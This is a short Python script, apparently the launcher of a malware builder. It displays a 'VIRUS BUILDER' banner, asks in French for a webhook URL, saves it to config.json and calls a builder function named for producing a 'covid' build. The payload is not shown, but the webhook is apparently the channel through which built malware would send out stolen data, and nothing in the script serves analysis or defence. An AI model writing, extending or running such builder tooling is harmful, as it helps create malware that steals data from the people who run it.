import os
import json
from builder import builder
from code.colors import MAGENTA


def build_covid():
    os.system("cls")
    try:
        webhook = input(f"""{MAGENTA}

                ██  ██ ██ █████▄  ██  ██ ▄█████   █████▄ ██  ██ ██ ██     ████▄
                ██▄▄██ ██ ██▄▄██▄ ██  ██ ▀▀▀▄▄▄   ██▄▄██ ██  ██ ██ ██     ██  ██
                 ▀██▀  ██ ██   ██ ▀████▀ █████▀   ██▄▄█▀ ▀████▀ ██ ██████ ████▀

                Met Ton Webhook : """)
    except ValueError as e:
        print(f"Error {e}")
        return

    with open("config.json", "w", encoding="utf-8") as f:
        json.dump({"webhook": webhook}, f, ensure_ascii=False, indent=4)
    builder()
